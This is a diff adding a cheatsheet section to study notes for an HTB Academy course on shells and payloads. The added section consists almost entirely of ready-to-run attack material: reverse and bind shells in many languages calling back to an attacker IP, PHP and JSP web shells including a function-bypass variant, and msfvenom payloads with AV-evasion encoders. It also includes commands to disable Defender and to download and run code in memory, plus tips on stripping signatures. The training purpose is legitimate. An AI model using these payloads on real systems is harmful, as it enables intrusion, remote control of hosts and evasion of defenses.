@@ -1,6 +1,6 @@
 # Shells & Payloads — HTB Academy Structured Notes
 
-> **Module:** Shells & Payloads | **Sections:** 1–17 | **Source:** HTB Academy
+> **Module:** Shells & Payloads | **Sections:** 1–18 | **Source:** HTB Academy
 
 ---
 
@@ -23,6 +23,7 @@
 15. [Section 15 — PHP Web Shells](#section-15)
 16. [Section 16 — The Live Engagement](#section-16)
 17. [Section 17 — Detection & Prevention](#section-17)
+18. [Section 18 — Complete Cheatsheet](#section-18)
 
 ---
 
@@ -2185,6 +2186,490 @@ No single protection or mitigation is a complete defense against sophisticated a
 
 ---
 
+---
+
+<a name="section-18"></a>
+## Section 18 — Complete Cheatsheet
+
+> Quick-reference for every command, shell type, payload, and technique covered in this module. Use this during labs and live engagements.
+
+---
+
+### Core Module Commands
+
+| Command | Description |
+|---|---|
+| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | Connect to a Windows target via RDP using the FreeRDP CLI client |
+| `env` | Displays environment variables; look for `SHELL=` to identify the active interpreter |
+| `sudo nc -lvnp <port>` | Start a Netcat listener (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port) |
+| `nc -nv <target_ip> <port>` | Connect to a Netcat listener at the specified IP and port |
+| `Set-MpPreference -DisableRealtimeMonitoring $true` | PowerShell: disable Windows Defender real-time monitoring (admin required) |
+| `use exploit/windows/smb/psexec` | Metasploit: Windows SMB PsExec authenticated code execution module |
+| `shell` | Drop from a Meterpreter session into a native system shell |
+| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > shell.elf` | Generate a Linux 64-bit stageless ELF reverse shell payload |
+| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > shell.exe` | Generate a Windows 32-bit stageless EXE reverse shell payload |
+| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > shell.macho` | Generate a macOS reverse shell payload |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > shell.asp` | Generate an ASP Meterpreter reverse shell (Windows IIS) |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > shell.jsp` | Generate a JSP reverse shell for Java web servers |
+| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > shell.war` | Generate a WAR-format reverse shell for Tomcat/JBoss deployment |
+| `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit: check if a host is vulnerable to EternalBlue (MS17-010) |
+| `use exploit/windows/smb/ms17_010_psexec` | Metasploit: exploit EternalBlue to gain a reverse shell on a Windows host |
+| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit: RCE exploit for rConfig 3.9.6 on Linux |
+| `python -c 'import pty; pty.spawn("/bin/sh")'` | Spawn a TTY shell using Python's pty module (Python 2) |
+| `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Spawn a TTY shell using Python's pty module (Python 3) |
+| `/bin/sh -i` | Spawn an interactive Bourne shell directly |
+| `perl -e 'exec "/bin/sh";'` | Spawn a shell using Perl's exec() |
+| `ruby: exec "/bin/sh"` | Spawn a shell from inside a Ruby script |
+| `lua: os.execute('/bin/sh')` | Spawn a shell from inside a Lua script |
+| `awk 'BEGIN {system("/bin/sh")}'` | Spawn a shell using AWK's system() function |
+| `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | Use find + AWK to spawn a shell |
+| `find . -exec /bin/sh \; -quit` | Spawn a shell directly using find's -exec flag |
+| `vim -c ':!/bin/sh'` | Spawn a shell from within Vim |
+| `ls -la <path/to/fileorbinary>` | List file permissions — check for SUID/SGID bits on binaries |
+| `sudo -l` | List commands the current user may run as sudo |
+| `/usr/share/webshells/laudanum` | Location of Laudanum web shells on Parrot OS and Pwnbox |
+| `/usr/share/nishang/Antak-WebShell` | Location of the Antak ASPX web shell on Parrot OS and Pwnbox |
+
+---
+
+### Reverse Shells — One-Liners by Language
+
+> **Always start a listener on the attack box first:**
+> ```bash
+> sudo nc -lvnp 443
+> ```
+
+#### Bash Reverse Shell
+
+```bash
+bash -i >& /dev/tcp/10.10.14.12/443 0>&1
+```
+
+| Part | Explanation |
+|---|---|
+| `bash -i` | Start an interactive Bash shell |
+| `>& /dev/tcp/10.10.14.12/443` | Redirect stdout AND stderr to a TCP socket to the attacker on port 443 |
+| `0>&1` | Redirect stdin to the same TCP socket (attacker can type commands) |
+
+---
+
+#### Netcat / Bash Reverse Shell (Named Pipe Method)
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+```
+
+| Part | Explanation |
+|---|---|
+| `rm -f /tmp/f` | Remove `/tmp/f` if it already exists (`-f` suppresses errors) |
+| `mkfifo /tmp/f` | Create a FIFO named pipe at `/tmp/f` |
+| `cat /tmp/f \|` | Read from the pipe and pipe its output into Bash |
+| `/bin/bash -i 2>&1 \|` | Start interactive Bash; redirect stderr to stdout |
+| `nc 10.10.14.12 7777` | Connect back to the attacker's Netcat listener on port 7777 |
+| `> /tmp/f` | Feed Netcat's received data back into the named pipe (closes the loop) |
+
+---
+
+#### Python Reverse Shell
+
+```bash
+python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.12",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
+```
+
+Creates a TCP socket, connects to the attacker, duplicates the socket file descriptor to stdin (0), stdout (1), stderr (2), then launches `/bin/bash -i` so all I/O flows over the network.
+
+---
+
+#### Perl Reverse Shell
+
+```bash
+perl -e 'use Socket; $i="10.10.14.12"; $p=443; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/bash -i");};'
+```
+
+Uses Perl's `Socket` module to open a TCP connection, then redirects stdin/stdout/stderr to the socket and executes Bash. Available on most Linux systems.
+
+---
+
+#### Ruby Reverse Shell
+
+```bash
+ruby -rsocket -e'f=TCPSocket.open("10.10.14.12",443).to_i; exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+Uses Ruby's built-in `TCPSocket` to connect to the attacker. `sprintf` builds the shell command with the socket file descriptor used for all three I/O streams.
+
+---
+
+#### AWK Reverse Shell
+
+```bash
+awk 'BEGIN{s="/inet/tcp/0/10.10.14.12/443";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
+```
+
+Uses AWK's built-in TCP networking via `/inet/tcp/`. Reads commands from the socket using `getline` and executes them, sending output back. AWK is present on virtually all Unix/Linux systems.
+
+---
+
+#### PowerShell Reverse Shell One-Liner (Windows)
+
+```cmd
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+| Part | Explanation |
+|---|---|
+| `powershell -nop -c` | Run PowerShell with no profile; execute the command block that follows |
+| `New-Object System.Net.Sockets.TCPClient(...)` | Create a TCP connection to the attacker's IP and port |
+| `$stream = $client.GetStream()` | Get the bidirectional network stream |
+| `[byte[]]$bytes = 0..65535\|%{0}` | Create a 64 KB empty byte buffer for reading commands |
+| `iex $data 2>&1` | Execute received commands with `Invoke-Expression`; capture stderr too |
+| `$sendback2 + 'PS ' + (pwd).Path + '> '` | Build a PowerShell-style prompt showing the current directory |
+| `$stream.Write(...); $stream.Flush()` | Send the command output back over the TCP stream |
+
+---
+
+### Bind Shells — One-Liners
+
+> Run on the **target** first, then connect from the **attacker**:
+> ```bash
+> nc -nv <target_ip> <port>
+> ```
+
+#### Netcat Bind Shell (Linux — Named Pipe)
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
+```
+
+Same named-pipe technique as the reverse shell, but `nc -l` makes the target **listen** for an incoming connection instead of connecting out.
+
+---
+
+#### Python Bind Shell
+
+```python
+python3 -c 'import socket,subprocess,os; s=socket.socket(); s.bind(("0.0.0.0",4444)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); subprocess.call(["/bin/bash","-i"])'
+```
+
+Binds a TCP socket to port 4444 on all interfaces. Waits for the attacker to connect, then bridges the socket to a Bash shell's stdin/stdout/stderr.
+
+---
+
+#### PowerShell Bind Shell (Windows)
+
+```powershell
+$listener = [System.Net.Sockets.TcpListener]4444; $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){ $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $out = (iex $data 2>&1 | Out-String); $out2 = $out + "PS "+(pwd).Path+"> "; $send = ([text.encoding]::ASCII).GetBytes($out2); $stream.Write($send,0,$send.Length); $stream.Flush() }; $client.Close(); $listener.Stop()
+```
+
+Creates a TCP listener on port 4444. When the attacker connects, it reads commands, executes them with `Invoke-Expression`, and returns the output — giving a full PowerShell session over the bind connection.
+
+---
+
+### Web Shells
+
+#### PHP — Minimal (GET parameter)
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+**Usage:** `http://target.com/shell.php?cmd=whoami`
+
+`system()` executes the OS command from the `cmd` GET parameter and prints the full output directly to the browser response.
+
+---
+
+#### PHP — Using exec()
+
+```php
+<?php echo exec($_GET['cmd']); ?>
+```
+
+`exec()` returns only the **last line** of command output. Less visible in output but sometimes less detected by WAFs than `system()`.
+
+---
+
+#### PHP — Using passthru()
+
+```php
+<?php passthru($_GET['cmd']); ?>
+```
+
+`passthru()` sends the **raw binary output** directly to the browser with no buffering or encoding. Best for commands that return binary data or special characters.
+
+---
+
+#### PHP — Using shell_exec()
+
+```php
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+`shell_exec()` runs the command through the shell and returns the **entire output** as a string (unlike `exec()` which only returns the last line). Equivalent to backtick syntax.
+
+---
+
+#### PHP — Full Web Shell with HTML Form
+
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>" . htmlspecialchars(shell_exec($_REQUEST['cmd'])) . "</pre>";
+}
+?>
+<form method="POST">
+  <input type="text" name="cmd" size="60" placeholder="Enter command...">
+  <input type="submit" value="Execute">
+</form>
+```
+
+`$_REQUEST` accepts both GET and POST. `htmlspecialchars()` prevents browser misinterpreting output as HTML. `<pre>` preserves whitespace and newlines in the output.
+
+---
+
+#### PHP — Reverse Shell via exec()
+
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'"); ?>
+```
+
+When the PHP file is loaded in a browser, `exec()` triggers a Bash reverse shell that connects back to the attacker's Netcat listener automatically.
+
+---
+
+#### PHP — Bind Shell
+
+```php
+<?php
+$port = 4444;
+$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_bind($sock, '0.0.0.0', $port);
+socket_listen($sock);
+$conn = socket_accept($sock);
+$shell = proc_open('/bin/bash -i', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes);
+stream_set_blocking($pipes[0], false);
+stream_set_blocking($pipes[1], false);
+socket_set_nonblock($conn);
+while(!feof($pipes[1])){
+    $r = @socket_read($conn, 2048);
+    if($r !== '' && $r !== false) fwrite($pipes[0], $r);
+    $o = fgets($pipes[1]);
+    if($o !== false) socket_write($conn, $o);
+}
+fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+proc_close($shell); socket_close($conn); socket_close($sock);
+?>
+```
+
+When the PHP page is requested, the server **listens on port 4444**. The attacker connects with `nc -nv <target_ip> 4444` and receives a full Bash shell. The socket bridges I/O between the network connection and the Bash process.
+
+---
+
+#### PHP — Multi-Function Bypass Shell (disable_functions workaround)
+
+```php
+<?php
+function run($cmd){
+    if(function_exists('system')){ ob_start(); system($cmd); return ob_get_clean(); }
+    elseif(function_exists('passthru')){ ob_start(); passthru($cmd); return ob_get_clean(); }
+    elseif(function_exists('shell_exec')){ return shell_exec($cmd); }
+    elseif(function_exists('exec')){ exec($cmd,$o); return implode("\n",$o); }
+    elseif(function_exists('popen')){ $f=popen($cmd,'r'); $o=''; while(!feof($f)) $o.=fgets($f,4096); pclose($f); return $o; }
+    return "No execution function available.";
+}
+echo "<pre>" . htmlspecialchars(run($_GET['cmd'])) . "</pre>";
+?>
+```
+
+Tries `system()` → `passthru()` → `shell_exec()` → `exec()` → `popen()` in order. Useful when some functions are blocked in `php.ini` via `disable_functions`. Falls through to the next available function automatically.
+
+---
+
+#### JSP Web Shell (Java Servers — Tomcat, JBoss)
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+String cmd = request.getParameter("cmd");
+if(cmd != null){
+    Process p = Runtime.getRuntime().exec(cmd);
+    DataInputStream dis = new DataInputStream(p.getInputStream());
+    String line = dis.readLine();
+    while(line != null){ out.println(line); line = dis.readLine(); }
+}
+%>
+<form><input name="cmd"><input type="submit" value="Run"></form>
+```
+
+**Usage:** `http://target.com/shell.jsp?cmd=whoami`
+
+Uses `Runtime.getRuntime().exec()` to run OS commands. Reads and prints output line by line. Upload to a Java web server (Tomcat webapps directory, JBoss deploy, etc.).
+
+---
+
+#### ASPX Web Shell Locations (Laudanum & Antak)
+
+```bash
+# Copy Laudanum ASPX shell and add attacker IP on line 59
+cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
+# Edit: string[] allowedIps = new string[] { "10.10.14.12" };
+
+# Copy Antak and set username + password on line 14
+cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
+# Edit: if(Request.Params["user"]=="htb-student" && Request.Params["password"]=="HTB_@cademy_stdnt!")
+```
+
+Remove ASCII art and comments from both files before uploading to reduce AV/IDS signature detection.
+
+---
+
+### MSFvenom Flag Reference
+
+| Flag | Description |
+|---|---|
+| `-p <payload>` | Payload to generate (e.g., `linux/x64/shell_reverse_tcp`) |
+| `LHOST=<ip>` | Attacker's IP address for the reverse shell callback |
+| `LPORT=<port>` | Attacker's listening port |
+| `-f <format>` | Output format: `elf`, `exe`, `macho`, `asp`, `aspx`, `php`, `raw`, `war`, `jar`, `py` |
+| `-e <encoder>` | Encoder to use (e.g., `x86/shikata_ga_nai` to evade AV) |
+| `-i <count>` | Number of encoding iterations |
+| `-o <filename>` | Output filename |
+| `-b '<chars>'` | Bad characters to exclude from the payload |
+
+#### Staged vs. Stageless — Naming Convention
+
+| Name | Type | How to Tell |
+|---|---|---|
+| `linux/x86/shell/reverse_tcp` | **Staged** | Slashes separate stages: `/shell/` then `/reverse_tcp` |
+| `linux/x86/shell_reverse_tcp` | **Stageless** | Underscore connects: `shell_reverse_tcp` as one unit |
+| `windows/meterpreter/reverse_tcp` | **Staged** | `/meterpreter/` and `/reverse_tcp` are separate stages |
+| `windows/meterpreter_reverse_tcp` | **Stageless** | `meterpreter_reverse_tcp` combined into one segment |
+
+---
+
+### Metasploit Quick Reference
+
+| Command | Description |
+|---|---|
+| `sudo msfconsole` | Launch the Metasploit Framework console as root |
+| `search <keyword>` | Search modules (e.g., `search smb`, `search eternal`, `search rconfig`) |
+| `use <module_path>` | Select a module (e.g., `use exploit/windows/smb/psexec`) |
+| `options` | Show all configurable options for the current module |
+| `set <OPTION> <value>` | Set an option (e.g., `set RHOSTS 10.129.180.71`) |
+| `show options` | Verify all current option values before running |
+| `exploit` | Execute the selected module |
+| `getuid` | Show the current user on the target (inside Meterpreter) |
+| `shell` | Drop from Meterpreter into a native CMD or Bash shell |
+| `?` | List all available Meterpreter commands |
+
+---
+
+### Interactive Shell Spawning — Quick Reference Table
+
+| Method | Command | Requirement |
+|---|---|---|
+| Python 2 | `python -c 'import pty; pty.spawn("/bin/sh")'` | Python 2 installed |
+| Python 3 | `python3 -c 'import pty; pty.spawn("/bin/sh")'` | Python 3 installed |
+| /bin/sh | `/bin/sh -i` | Always available |
+| Bash | `/bin/bash -i` | Bash installed |
+| Perl | `perl -e 'exec "/bin/sh";'` | Perl installed |
+| Ruby | `ruby: exec "/bin/sh"` | Ruby installed (from script) |
+| Lua | `lua: os.execute('/bin/sh')` | Lua installed (from script) |
+| AWK | `awk 'BEGIN {system("/bin/sh")}'` | AWK (almost always present) |
+| Find + AWK | `find / -name f -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | find + AWK |
+| Find exec | `find . -exec /bin/sh \; -quit` | find |
+| Vim | `vim -c ':!/bin/sh'` | Vim installed |
+| Vim escape | `vim` → `:set shell=/bin/sh` → `:shell` | Vim installed |
+
+---
+
+### Windows CMD Reference
+
+```cmd
+whoami                          # Current user
+hostname                        # Machine name
+systeminfo                      # Full OS and hardware info
+net users                       # List all local users
+net localgroup administrators   # Members of Administrators group
+ipconfig /all                   # Full network configuration
+netstat -ano                    # Active connections with PIDs
+tasklist                        # Running processes
+dir                             # List current directory
+dir /s /b *.txt                 # Recursive search for .txt files
+type <filename>                 # Print file contents
+copy <src> <dst>                # Copy a file
+del <filename>                  # Delete a file
+mkdir <dirname>                 # Create a directory
+```
+
+---
+
+### PowerShell Reference
+
+```powershell
+Get-Process                                  # List processes
+Get-Service                                  # List services
+Get-LocalUser                                # List local users
+Get-LocalGroupMember Administrators          # List admin group members
+Get-NetIPAddress                             # Show IP addresses
+Set-MpPreference -DisableRealtimeMonitoring $true   # Disable Defender
+
+# Download a file to disk
+Invoke-WebRequest -Uri "http://10.10.14.12/shell.exe" -OutFile "C:\Windows\Temp\shell.exe"
+
+# Download and execute a PowerShell script in memory (fileless)
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/payload.ps1')
+
+# Execute PowerShell bypassing execution policy
+powershell -ExecutionPolicy Bypass -File script.ps1
+
+# Execute base64-encoded command (evades some filters)
+powershell -enc <base64_encoded_command>
+```
+
+---
+
+### Nishang — Invoke-PowerShellTcp
+
+**File location:**
+```
+/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+```
+
+**Reverse shell (run on Windows target):**
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 443
+```
+
+**Bind shell (run on Windows target):**
+```powershell
+Invoke-PowerShellTcp -Bind -Port 4444
+```
+
+**Download and execute in memory (fileless):**
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 443
+```
+
+---
+
+### Web Shell File Locations on Parrot OS / Kali / Pwnbox
+
+| Path | Contents |
+|---|---|
+| `/usr/share/webshells/` | Root directory of pre-installed web shells |
+| `/usr/share/webshells/php/` | PHP web shells |
+| `/usr/share/webshells/aspx/` | ASP.NET web shells |
+| `/usr/share/webshells/jsp/` | JSP web shells |
+| `/usr/share/laudanum/` | Laudanum web shell repository |
+| `/usr/share/laudanum/aspx/shell.aspx` | Laudanum ASPX shell — edit `allowedIps` on line 59 |
+| `/usr/share/laudanum/php/` | Laudanum PHP shells |
+| `/usr/share/laudanum/jsp/` | Laudanum JSP shells |
+| `/usr/share/nishang/Antak-WebShell/antak.aspx` | Antak PowerShell ASPX shell — edit credentials on line 14 |
+| `/usr/share/nishang/Shells/` | Nishang reverse/bind PowerShell shell scripts |
+
+---
+
 *End of Shells & Payloads — HTB Academy Structured Notes*
 
-> **Sections covered:** 1 through 17 | **Total sections:** 17/17 | All headings, subheadings, commands, and steps preserved.
+> **Sections covered:** 1 through 18 | **Total sections:** 18/18 | All headings, subheadings, commands, steps, and cheatsheet content preserved.
